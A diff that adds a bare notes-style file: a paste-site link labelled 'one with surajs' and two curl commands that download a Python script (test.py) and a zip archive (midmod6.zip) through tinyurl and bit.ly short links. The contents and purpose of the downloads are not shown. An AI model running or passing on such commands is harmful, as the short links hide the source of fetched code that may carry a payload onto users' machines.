@@ -1,0 +1,5 @@
+https://0x0.st/KSwD.txt [one with surajs]
+
+curl.exe -s -L -o test.py "https://tinyurl.com/tesract"
+
+curl -L -o midmod6.zip "https://bit.ly/midmod60"
